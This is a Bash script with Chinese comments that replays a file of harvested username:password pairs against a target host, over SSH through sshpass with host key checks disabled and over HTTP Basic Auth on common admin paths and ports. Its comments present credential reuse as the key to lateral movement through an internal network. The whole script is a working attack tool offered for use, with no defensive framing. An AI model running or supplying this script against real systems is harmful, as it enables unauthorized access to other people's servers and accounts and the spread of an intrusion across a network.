#!/bin/bash
# 通用凭据重放：把收集到的凭据清单对指定主机的开放服务批量重放。
# 凭据复用是横向移动的第一生产力：一个入口凭据往往能开整张内网。
# 用法: creds_replay.sh <目标IP> [凭据文件]
#   凭据文件每行一条 user:password（默认读 /opt/tools/creds.txt 或 $CREDS_FILE）
# 收集凭据: echo "admin:Admin123" >> /opt/tools/creds.txt（从 NOTES/HOSTS 台账汇聚）
TARGET="$1"
CREDS="${2:-${CREDS_FILE:-/opt/tools/creds.txt}}"
[ -z "$TARGET" ] && { echo "usage: creds_replay.sh <ip> [creds.txt]"; exit 1; }
[ -f "$CREDS" ] || { echo "凭据文件不存在: $CREDS（先把收集到的凭据按 user:pass 每行一条写入）"; exit 1; }
hits=0

port_open() { timeout 2 bash -c "echo >/dev/tcp/$1/$2" 2>/dev/null; }

# --- SSH (22) ---
if port_open "$TARGET" 22; then
  echo "== SSH $TARGET =="
  while IFS=: read -r u p; do
    [ -z "$u" ] && continue
    if sshpass -p "$p" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 \
         -o PreferredAuthentications=password -o PubkeyAuthentication=no \
         "$u@$TARGET" 'echo OK; hostname' 2>/dev/null; then
      echo "[+] SSH 命中: $u:$p @ $TARGET"; hits=$((hits+1)); break
    fi
  done < "$CREDS"
fi

# --- HTTP Basic Auth 后台（常见管理路径） ---
for port in 80 443 8080 8443 8000 9090; do
  port_open "$TARGET" "$port" || continue
  scheme=http; { [ "$port" = 443 ] || [ "$port" = 8443 ]; } && scheme=https
  base="$scheme://$TARGET:$port"
  while IFS=: read -r u p; do
    [ -z "$u" ] && continue
    for path in /admin /manager/html /api /; do
      code=$(curl -s -o /dev/null -m 5 -w "%{http_code}" -u "$u:$p" "$base$path" 2>/dev/null)
      if [ "$code" = 200 ]; then
        echo "[+] BasicAuth 可能命中: $u:$p @ $base$path (200)"; hits=$((hits+1))
      fi
    done
  done < "$CREDS"
done

[ "$hits" = 0 ] && echo "[-] 无命中：把新收集的凭据追加进 $CREDS 后再跑，或检查端口"
exit 0
